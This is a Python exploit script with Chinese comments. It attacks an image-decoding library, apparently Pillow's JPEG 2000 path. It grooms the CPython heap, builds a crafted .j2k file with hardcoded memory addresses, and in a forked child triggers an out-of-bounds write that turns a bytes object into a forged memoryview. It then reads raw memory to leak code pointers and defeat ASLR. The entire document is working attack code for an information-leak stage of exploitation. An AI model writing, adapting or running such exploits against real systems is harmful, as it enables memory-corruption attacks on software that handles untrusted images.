#!/usr/bin/env python3
# 信息泄露 v2：
#   ① groom 在【父进程】做（干净堆 => 稳定出大量相邻对）
#   ② fork 后子进程只做：解码（触发越界写）+ 扫描被混淆对象 + 读内存 + 落盘
#   ③ 目标：喷射出的 bytes 被改成 memoryview，buf=0xa500d0 => 读出代码指针 => 打掉 ASLR
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
PY_MV = 0xA350C8
READ_ADDR = 0xA500D0
PY_BYTES_TYPE = 0xA22670
RES = '/tmp/leak_result2.txt'

raw = bytearray(519)
struct.pack_into('<Q', raw, 0x20, PY_BYTES_TYPE)      # obj+0x40 = view.obj（非空合法）
struct.pack_into('<Q', raw, 0x28, 0x40)               # obj+0x48 = len（会被耦合覆盖）
struct.pack_into('<Q', raw, 0x30, 1)                  # obj+0x50 = itemsize
struct.pack_into('<Q', raw, 0x38, 0x100000000)        # obj+0x58 = readonly/ndim
VC = bytes(raw)

# 构建
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/LEAK.j2k', '0', '23',
                    hex(PY_MV), hex(0xA40000), hex(READ_ADDR), '-370'],
                   capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:70])
if 'OK' not in r.stdout:
    sys.exit(1)

# ---- ① 父进程里 groom ----
good = None
for attempt in range(8):
    gc.collect()
    prime = [bytes(519) for _ in range(1024)]
    del prime
    pairs = [(bytes(519), bytes(bytearray(VC))) for _ in range(400)]
    good = [(D, Bv) for (D, Bv) in pairs if id(Bv) - id(D) == 0x230]
    if good:
        break
    del pairs
print("[*] 相邻对 = %d (试了 %d 次)" % (len(good), attempt + 1))
if not good:
    print("[!] 本次没有相邻对，重跑即可"); sys.exit(0)

keep = [t for i, t in enumerate(good) if i != len(good) // 2]
Ks = [Bv for (D, Bv) in keep]           # 候选受害者（保持占用）
holeD = good[len(good) // 2][0]         # 只释放这一个洞
del holeD, pairs, good, keep
gc.collect()
print("[*] 候选受害者 %d 个" % len(Ks))

# ---- ② fork 子进程解码 + 扫描 + 读 ----
pid = os.fork()
if pid == 0:
    out = []
    try:
        M = open('/tmp/LEAK.j2k', 'rb').read()
        im = Image.open(io.BytesIO(M))
        im.load()
        out.append("解码完成")
    except BaseException as e:
        out.append("解码异常 %r" % (e,))
    hits = [Bv for Bv in Ks if R(id(Bv) + 8) == PY_MV]
    out.append("命中 memoryview 数=%d" % len(hits))
    if hits:
        v = hits[0]
        out.append("命中 id=%#x buf=%#x len=%#x" % (id(v), R(id(v) + 0x38), R(id(v) + 0x48)))
        try:
            data = v[:64].tobytes()
            out.append("读出64B=" + data.hex())
            ptrs = [struct.unpack_from('<Q', data, k)[0] for k in range(0, 64, 8)]
            out.append("指针=" + ",".join(hex(x) for x in ptrs if x > 0x10000))
        except BaseException as e:
            out.append("读取异常 %r" % (e,))
    with open(RES, 'w') as f:
        f.write("\n".join(out))
    os._exit(0)
os.waitpid(pid, 0)
print(open(RES).read() if os.path.exists(RES) else "(无结果)")